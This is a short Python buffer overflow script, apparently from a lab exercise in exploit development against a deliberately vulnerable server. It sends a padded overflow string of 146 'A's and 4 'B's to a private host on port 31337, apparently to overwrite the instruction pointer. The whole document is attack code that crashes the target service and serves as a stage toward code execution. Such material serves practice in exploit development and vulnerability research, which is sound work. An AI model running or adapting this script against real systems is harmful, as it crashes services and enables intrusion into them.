#!/usr/bin/python3
import sys, socket
 
RHOST = '10.0.2.6'
RPORT = 31337

offset = 146
buffer = "A" * offset + "B" * 4
 
try:
    # payload = "TRUN /.:/" + buffer
    # payload = buffer + "\r\n"
    payload = buffer
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send((payload.encode()))
    s.close()
except:
    print ("Error connecting to the server")
    sys.exit()